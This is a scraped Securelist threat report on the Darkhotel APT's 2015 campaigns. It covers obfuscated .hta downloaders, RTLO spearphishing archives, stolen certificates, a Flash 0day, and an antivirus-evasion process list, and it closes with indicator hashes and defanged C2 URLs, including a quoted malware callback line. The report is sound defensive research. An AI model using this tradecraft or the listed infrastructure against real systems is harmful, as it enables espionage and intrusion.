# Reference for threat actor for "DarkHotel"

**Title**: Darkhotel's attacks in 2015 | Securelist

**Source**: https://securelist.com/darkhotels-attacks-in-2015/71713/

## Content















Darkhotel's attacks in 2015 | Securelist




































































Solutions for:

Home Products
Small Business 1-50 employees
Medium Business 51-999 employees
Enterprise 1000+ employees
 



















by Kaspersky


CompanyAccount
Get In Touch
Dark mode off
EnglishRussianSpanish













Solutions



Hybrid Cloud SecurityLearn More
Internet of Things & Embedded SecurityLearn More
Threat Management and DefenseLearn More
Industrial CybersecurityLearn More
Fraud PreventionLearn More



Other solutions
Blockchain Security
Kaspersky for Security Operations Center


Industries



National CybersecurityLearn More
Industrial CybersecurityLearn More
Finance Services CybersecurityLearn More
Healthcare CybersecurityLearn More
Transportation CybersecurityLearn More
Retail CybersecurityLearn More



Other Industries
Telecom Cybersecurity
Blockchain Security
View all


Products



KasperskyEndpoint Security for BusinessLearn More
KasperskyEndpoint Detection and Response (EDR)Learn More
KasperskyEDR OptimumLearn More
KasperskyAnti Targeted Attack PlatformLearn More
KasperskyManaged Detection and ResponseLearn More
KasperskySandboxLearn More



Other Products
Kaspersky Security for Mail Server
Kaspersky Security for Internet Gateway
Kaspersky Embedded Systems Security
Kaspersky Hybrid Cloud Security for AWS
Kaspersky Hybrid Cloud Security for Azure
View All


Services



KasperskyCybersecurity ServicesLearn More
KasperskyAdaptive Online TrainingLearn More
KasperskyPremium SupportLearn More
KasperskyThreat IntelligenceLearn More
KasperskyAPT Intelligence ReportingLearn More
KasperskyTargeted Attack DiscoveryLearn More



Other Services
Kaspersky Professional Services
Kaspersky Incident Response
Kaspersky Cybersecurity Training
Kaspersky Incident Communications
Kaspersky Security Awareness
View All


Resource Center

Case Studies
White Papers
Datasheets
Technologies
MITRE ATT&CK

About Us

Transparency
Corporate News
Press Center
Careers
Innovation Hub
Sponsorship
Policy Blog
Contacts

GDPR
 





Subscribe
 Dark mode off
Login


Securelist menu

EnglishRussianSpanish
Existing Customers

Personal

My Kaspersky
Renew your product
Update your product
Customer support

Business

KSOS portal
Kaspersky Business Hub
Technical Support
Knowledge Base
Renew License


Home

Products
Trials&Update
Resource Center

Business

Small Business (1-50 employees)
Medium Business (51-999 employees)
Enterprise (1000+ employees)


Securelist
Threats

Financial threats
Mobile threats
Web threats
Secure environment (IoT)
Vulnerabilities and exploits
Spam and Phishing
Industrial threats

Categories

APT reports
Incidents
Research
Malware reports
Spam and phishing reports
Publications
Kaspersky Security Bulletin

Archive
All Tags
APT Logbook
Webinars
Statistics
Encyclopedia
Threats descriptions
KSB 2021

About Us

Company
Transparency
Corporate News
Press Center
Careers
Sponsorships
Policy Blog
Contacts

Partners

Find a Partner
Partner Program
















Content menu
Close













Subscribe













by Kaspersky

 Dark mode off




ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 











 

APT reports

Darkhotel’s attacks in 2015 

APT reports

10 Aug 2015

  minute read								
















Table of Contents





Consistent use of obfuscated .hta downloadersSpearphishing and .rar Attachments with RTLOStolen certificates and evasionTisone360.com, Visits, and Hacking Team Flash 0dayA consistent attack flowHiding infrastructure in plain sightTechnical detailsHTA md5:Spearphish attachments md5:2015 large downloader md5:Infostealers dropped in 2015Subhosts and urls:Parallel and Previous Research 






 

Authors




GReAT





Darkhotel APT attacks dated 2014 and earlier are characterized by the misuse of stolen certificates, the deployment of .hta files with multiple techniques, and the use of unusual methods like the infiltration of hotel Wi-Fi to place backdoors in targets’ systems. In 2015, many of these techniques and activities remain in use. However, in addition to new variants of malicious .hta, we find new victims, .rar attachments with RTLO spearphishing, and the deployment of a 0day from Hacking Team.
The Darkhotel APT continues to spearphish targets around the world, with a wider geographic reach than its previous botnet buildout and hotel Wi-Fi attacks. Some of the targets are diplomatic or have strategic commercial interests.
The location of Darkhotel’s targets and victims in 2015:

North Korea
Russia
South Korea
Japan
Bangladesh
Thailand
India
Mozambique
Germany

2015 Darkhotel .hta and backdoor-related, exploit-related and c2 sites:

storyonboard[.]net
tisone360[.]org
openofficev[.]info
saytargetworld[.]net
error-page[.]net
eonlineworld[.]net
enewsbank[.]net
thewordusrapid[.]com

2015 spearphishing incident attachment name subset:

schedule(6.1~6).rar -> schedule(6.1~6)_?gpj.scr
schedule(2.11~16).rar -> schedule(2.11~16)_?gpj.scr
congratulation.rar -> congratulation_?gpj.scr
letter.rar -> letter_?gpj.scr

Consistent use of obfuscated .hta downloaders
Whether the infection is achieved through spearphishing, physical access to a system or the Hacking Team Flash 0day, there frequently seems to be a common method for a newly-infected system to communicate with Darkhotel’s c2:
A lightly obfuscated (double escaped set of javascript variable values) script maintained within an .hta file writes an executable to disk and executes it.
It is interesting that this particular group has for years now deployed backdoor and downloader code in the form of .hta files. In 2010, we observed it re-purposing articles on North Korea by the US think-tank, Brookings Institute, in order to attack North Korean-related targets with malicious code buried in .hta files. It also emailed links to its malicious .hta files to North Korean tourist groups, economists with an interest in North Korea, and more. It’s somewhat strange to see such heavy reliance on older Windows-specific technology like HTML applications, introduced by Microsoft in 1999.
From the recent sendspace[.]servermsys[.]com/downloader.hta:

After execution and escaping a couple of variables, the .hta uses ancient Adodb.stream components in order to write out a string xor’d with 0x3d as an executable file and runs it.

This code results in the execution of “internet_explorer_Smart_recovery.exe” 054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2. In this case, it seems that Darkhotel operators are checking as to whether or not the victim’s default browser is Internet Explorer, as all versions of IE return the value “0” and other browsers leave “appMinorVersion” undefined. This data collection seems somewhat odd, because .hta files are supported and run by mshta.exe on Windows systems only, still delivered with Windows 8. Perhaps it is an artefact from early development of the code. Here is a recent version:
“hxxp://sendspace[.]servermsys[.]com/readme.php?type=execution&result=created_and_executed&info=” + navigator.appMinorVersion + “

The “internet_explorer_Smart_recovery.exe” file is a simple obfuscated downloader. A series of xor 0x28 loops decrypt the contents of a self-deletion batch file, which is then written to disk and executed. Later in the execution, a more complex rc4 loop decrypts the download url and other strings and imports.

When finished, this url string decryption and connectback looks like
http://sendspace[.]servermsys[.]com/wnctprx. The file is downloaded (b1f56a54309147b07dda54623fecbb89) to “.tmp” file in %temp%, executed, and the downloader exits. This larger file is a backdoor/downloader that includes ssh functionality, and drops its keys to disk for ssh interaction. We find older Darkhotel information stealers dropped and run on the system by these downloaders.
Spearphishing and .rar Attachments with RTLO
The Darkhotel APT will relentlessly spearphish specific targets in order to successfully compromise systems. Some targets are spearphished repeatedly with much the same social-engineering schemes. For example, the attachment “schedule(2.11~16).rar” could be sent on February 10th, with Darkhotel returning to the same targets in late May for a second attempt with attachment “schedule(6.1~6).rar”.

It consistently archives RTLO .scr executable files with in .rar archives, in order to appear to the target as innocuous .jpg files. These executable files are lite droppers, maintaining these decoy jpeg files, and code to create an lnk downloader.

When the target attempts to open what they think is a jpg image file, the executable code runs and drops a jpg image to disk, then opens it with mspaint.exe in the background. This “congratulations” document is in Korean, revealing a likely characteristic of the intended target.

While the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and launches it. The shortcut maintains a multiline target shell script. This technique is also used by other APTs as persistence mechanisms, as documented by our colleagues. The 64kb lnk file is downloader code:

When this lnk file is executed, it begins an AJAX-based download process for the “unzip.js” file (a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file implementing AJAX to download and execute a relatively large compiled executable:

This executable code is saved to %temp%\csrtsrm.exe and executed there. It is a relatively large executable (~1.2 mb) that injects malicious code and spawns remote threads into legitimate processes.
Stolen certificates and evasion
The group appears to maintain a stockpile of stolen certificates and deploys their downloaders and the backdoors signed with them. Some of the more recent revoked certificates include ones that belong to Xuchang Hongguang Technology Co. Ltd.
Darkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly adapted to attacking better-defended environments and prefers not to burn these stolen digital certificates. In previous attacks it would simply have taken advantage of a long list of weakly implemented, broken certificates.
Not only are its obfuscation techniques becoming stronger, but its anti-detection technology list is growing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec) decrypts a set of anti-malware strings in stages to identify defensive technologies on a newly-infected system, and then opens each process, looking for a matching image name:
c:\avast! sandbox\WINDOWS\system32\kernel32.dll – Avast!
avp.exe – Kaspersky Lab
mcagent.exe;mcuicnt.exe – Intel/Mcafee
bdagent.exe – BitDefender
ravmon.exe,ravmond.exe – Beijing Rising
360tray.exe,360sd.exe,360rp.exe,exeMgr.exe – Qihoo 360
ayagent.aye,avguard.;avgntsd.exe – Avira Antivirus
ccsvchst.exe,nis.exe – Symantec Norton
avgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe – Avast!
msseces.exe;msmpeng.exe – Microsoft Security Essentials and Microsoft Anti-Malware Service
AVK.exe;AVKTray.exe – G-Data
avas.exe – TrustPort AV
tptray.exe – Toshiba utility
fsma32.exe;fsorsp.exe – F-Secure
econser.exe;escanmon.exe – Microworld Technologies eScan
SrvLoad.exe;PSHost.exe – Panda Software
egui.exe;ekrn.exe – ESET Smart Security
pctsSvc.exe;pctsGui.exe – PC Tools Spyware Doctor
casc.exe;UmxEngine.exe – CA Security Center
cmdagent.exe;cfp.exe – Comodo
KVSrvXP.exe;KVMonXP.exe – Jiangmin Antivirus
nsesvc.exe;CClaw.exe – Norman
V3Svc.exe – Ahnlab
guardxup. – IKARUS
FProtTray. – F-Prot
op_mon – Agnitum Outpost
vba332ldr.;dwengine. – DrWeb
Even the identifying information that the backdoor seeks from a system is not decrypted until runtime. Like the “information-stealer” component documented in our previous Darkhotel technical report, this component seeks to steal a set of data with which to identify the infected system. Much of the information is collected with the same set of calls, i.e. kernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:

Default system codepage
Network adapter information
Processor architecture
Hostname and IP address
Windows OS and Service Pack versions

Essentially, much of this information-stealer code is the same as that observed in previous attacks.
Tisone360.com, Visits, and Hacking Team Flash 0day
The tisone360.com site was especially interesting to us. In April 2015, Darkhotel was email-phishing with links to earlier (cve-2014) Flash exploits, and then, at the beginning of July, it began to distribute what is reported to be a leaked Hacking Team Flash 0day.
It looks like the Darkhotel APT may have been using the leaked HackingTeam Flash 0day to target specific systems. We can pivot from “tisone360.com” to identify some of this activity. The site was up and active as late as 22 July, 2015. However, this looks to be a small part of its activity. In addition to the icon.swf HT 0day (214709aa7c5e4e8b60759a175737bb2b), it looks as though the “tisone360.com” site was delivering a Flash CVE-2014-0497 exploit in April. We reported the related vulnerability to Adobe in January 2014, when it was being used by the Darkhotel APT.
Recently, the Darkhotel APT has maintained multiple working directories on this site.

It is the ims2 directory that is the most active. It contains a set of backdoors and exploits. The most interesting of these is the reported Hacking Team Flash 0day, icon.swf. In the days following the public mention of this server, the crew slowly tightened down open access to /ims2/. Either way, the contents continued to be actively used.
icon.swf (214709aa7c5e4e8b60759a175737bb2b) -> icon.jpg (42a837c4433ae6bd7490baec8aeb5091)
 -> %temp%\RealTemp.exe (61cc019c3141281073181c4ef1f4e524)
After icon.jpg is downloaded by the flash exploit, it is decoded with a multi-byte xor key 0xb369195a02. It then downloads further components.
It’s interesting to note that the group appears to be altering the compilation and linker timestamps of its executable code to dates in 2013. We see this across multiple samples deployed and observed for the first time in mid-2015, including the icon.jpg downloader.

A log of visits to the site directory records that the directory was set up on July 8th. A handful of visits to a specific url on the server from five systems based in the following locations were recorded on the 8th and 9th. Several of these are likely to be Darkhotel APT targets:

Germany
South Korea
China (likely to be research)
US
Japan

However, one of those systems hammered the site on the 9th, visiting almost 12,000 times in 30 minutes. This volume of traffic is likely to represent a noisy scanning research attempt and not someone DoS’ing the site:

Recorded site visits following the 9th are likely to be unreliable and may be more researchers, responding to the growing notoriety of the site following the public reports on the 9th. Many of these approximately 50 visits come from a subset of the above systems and are repeated multiple times. Visits from the following locations occurred on or after the 10th:

Germany (likely  to be  research)
Ukraine (likely  to be  research)
Amazon Web Services, multiple locations (likely to be research)
Googlebot, multiple locations
US
Ireland (likely to be research)
Russia
Brazil
China
Finland
Canada
Taiwan
France (likely to be research)
Czech Republic

A consistent attack flow
The Darkhotel group tends to stick with what works. For example, for years we saw repeated use of spearphishing targets directly with .hta files. Now, as with the tisone360.com site above, we have seen repeated use in 2015 of a creative chain of delivery sets.
downloader -> hta checkin -> info stealer -> more compiled components.
dropper -> wsh script -> wsh script -> info stealer -> more compiled components
spearphish -> dropper -> hta checkin -> downloader -> info stealer
While a chain of delivery that includes obfuscated scripts within .hta files occurred as far back as 2011, the volume appears to have picked up in 2014 and now 2015.
openofficev[.]info (2015)
office-revision[.]com (2014)
online.newssupply[.]net (2011)
Hiding infrastructure in plain sight
The group is now more vigilant in maintaining its sites, tightening up configuration and response content. Right now, its c2 responds with anti-hero images of “Drinky Crow” from the alt Maakies cartoon:

Other Darkhotel c2s tend to blend in with random sites on the web when incorrect or missing pages are visited. They are ripping images either from FOTOLIA or articles on artisanal ice cream makers here:

Technical details
HTA md5:
021685613fb739dec7303247212c3b09
1ee3dfce97ab318b416c1ba7463ee405
2899f4099c76232d6362fd62ab730741
2dee887b20a06b8e556e878c62e46e13
6b9e9b2dc97ff0b26a8a61ba95ca8ff6
852a9411a949add69386a72805c8cb05
be59994b5008a0be48934a9c5771dfa5
e29693ce15acd552f1a0435e2d31d6df
fa67142728e40a2a4e97ccc6db919f2b
fef8fda27deb3e950ba1a71968ec7466
Spearphish attachments md5:
5c74db6f755555ea99b51e1c68e796f9
c3ae70b3012cc9b5c9ceb060a251715a
560d68c31980c26d2adab7406b61c651
da0717899e3ccc1ba0e8d32774566219
d965a5b3548047da27b503029440e77f
dc0de14d9d36d13a6c8a34b2c583e70a
39562e410bc3fb5a30aca8162b20bdd0 (first seen late 2014, used into 2015)
e85e0365b6f77cc2e9862f987b152a89 (first seen late 2014, used into 2015)
2015 large downloader md5:
5e01b8bc78afc6ecb3376c06cbceb680
61cc019c3141281073181c4ef1f4e524
3d2e941ac48ae9d79380ca0f133f4a49
fc78b15507e920b3ee405f843f48a7b3
da360e94e60267dce08e6d47fc1fcecc
33e278c5ba6bf1a545d45e17f7582512
b1f56a54309147b07dda54623fecbb89
009d85773d519a9a97129102d8116305
Infostealers dropped in 2015
61637a0637fb25c53f396c305efa5dc5
a7e78fd4bf305509c2fc1b3706567acd
Subhosts and urls:
tisone360[.]com/img_h/ims2/icon.swf
tisone360[.]com/img_h/ims2/1.php
tisone360[.]com/img_h/ims2/icon.jpg
tisone360[.]com/noname/img/movie.swf
tisone360[.]com/noname/minky/face.php
tisone360[.]com/htdoc/ImageView.hta
tisone360[.]com/htdoc/page1/page.html
daily[.]enewsbank[.]net/wmpsrx64
daily[.]enewsbank[.]net/newsviewer.hta
saytargetworld[.]net/season/nextpage.php
sendspace[.]servermsys.com/wnctprx
error-page[.]net/update/load.php
photo[.]storyonboard[.]net/wmpsrx64
photo[.]storyonboard[.]net/photoviewer.hta
photo[.]storyonboard[.]net/readme.php
unionnewsreport[.]net/aeroflot_bonus/ticket.php
www[.]openofficev[.]info/xopen88/office2
www[.]openofficev[.]info/dec98/unzip.js
www[.]openofficev[.]info/open99/office32
www[.]openofficev[.]info/decod9/unzip.js
Parallel and Previous Research
CVE-2014-0497 – A 0-day Vulnerability
Hacking Team Flash Zero-Day Tied To Attacks In Korea and Japan… on July 1
The Darkhotel APT
Read more about how you can protect your company against the Darkhotel threat actor here.







APT
Cyber espionage
Digital Certificates
Spear phishing
Targeted attacks
Vulnerabilities and exploits



Authors




GReAT





Darkhotel’s attacks in 2015 
 Your email address will not be published. Required fields are marked *Name * 
Email * 

  




Cancel 

Δ 







Tom Creedon 


							Posted on							August 14, 2015. 3:56 pm 



The “Korean language” document is specifically North Korean (DPRK).  Folks in South Korea (ROK) do not write in that fashion an being signed by 김영남.
Reply 



















Table of Contents





Consistent use of obfuscated .hta downloadersSpearphishing and .rar Attachments with RTLOStolen certificates and evasionTisone360.com, Visits, and Hacking Team Flash 0dayA consistent attack flowHiding infrastructure in plain sightTechnical detailsHTA md5:Spearphish attachments md5:2015 large downloader md5:Infostealers dropped in 2015Subhosts and urls:Parallel and Previous Research 





GReAT webinars






																		13 May 2021, 1:00pm								
GReAT Ideas. Balalaika Edition 





Boris Larin



Denis Legezo










																		26 Feb 2021, 12:00pm								
GReAT Ideas. Green Tea Edition 





John Hultquist



Brian Bartholomew



Suguru Ishimaru



Vitaly Kamluk



Seongsu Park



Yusuke Niwa



Motohiko Sato










																		17 Jun 2020, 1:00pm								
GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots 





Marco Preuss



Denis Legezo



Costin Raiu



Kurt Baumgartner



Dan Demeter



Yaroslav Shmelev










																		26 Aug 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat actors advance on new fronts 





Ivan Kwiatkowski



Maher Yamout



Noushin Shabab



Pierre Delcher



Félix Aime



Giampaolo Dedola



Santiago Pontiroli










																		22 Jul 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat hunting and new techniques 





Dmitry Bestuzhev



Costin Raiu



Pierre Delcher



Brian Bartholomew



Boris Larin



Ariel Jungheit



Fabio Assolini












From the same authors




 


APT annual review: What the world’s threat actors got up to in 2020 






 


Cyberthreats to financial organizations in 2021 






 


Advanced Threat predictions for 2021 






 


Ghimob: a Tétrade threat actor moves to infect mobile devices 






 


APT trends report Q3 2020 









Subscribe to our weekly e-mails
The hottest research right in your inbox




Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ








In the same category




 


HrServ – Previously unknown web shell used in APT attack 






 


Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 






 


A cascade of compromise: unveiling Lazarus’ new campaign 






 


How to catch a wild triangle 






 


StripedFly: Perennially flying under the radar 






 















Latest Posts




 



Malware descriptions

Cracked software beats gold: new macOS backdoor stealing cryptowallets 





Sergey Puzan










 



Kaspersky Security Bulletin

Dark web threats and dark market predictions for 2024 





Sergey Lozhkin



Anna Pavlovskaya



Kaspersky Security Services










 



Research

A lightweight method to detect potential iOS malware 





Maher Yamout










 



Research

Operation Triangulation: The last (hardware) mystery 





Boris Larin












Latest Webinars





 




Technologies and services



												11 Dec 2023, 4:00pm					
60 min

The Future of AI in cybersecurity: what to expect in 2024






Vladimir Dashchenko



Victor Sergeev



Vladislav Tushkanov



Dennis Kipker











 




Threat intelligence and IR



												30 Nov 2023, 4:00pm					
70 min

Responding to a data breach: a step-by-step guide






Anna Pavlovskaya











 




Cyberthreat talks



												14 Nov 2023, 4:00pm					
60 min

2024 Advanced persistent threat predictions






Igor Kuznetsov



David Emm



Marc Rivero



Dan Demeter



Sherif Magdy











 




Cyberthreat talks



												09 Nov 2023, 5:00pm					
60 min

Overview of modern car compromise techniques and methods of protection






Alexander Kozlov



Sergey Anufrienko












Reports







HrServ – Previously unknown web shell used in APT attack 

In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.








Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 

Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.








A cascade of compromise: unveiling Lazarus’ new campaign 

We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns








How to catch a wild triangle 

How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.








 









Subscribe to our weekly e-mails
The hottest research right in your inbox





Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe











Δ








 











ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 









© 2024 AO Kaspersky Lab. All Rights Reserved.
Registered trademarks and service marks are the property of their respective owners.



Privacy Policy
License Agreement
Cookies












Subscribe to our weekly e-mails
The hottest research right in your inbox



Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ



























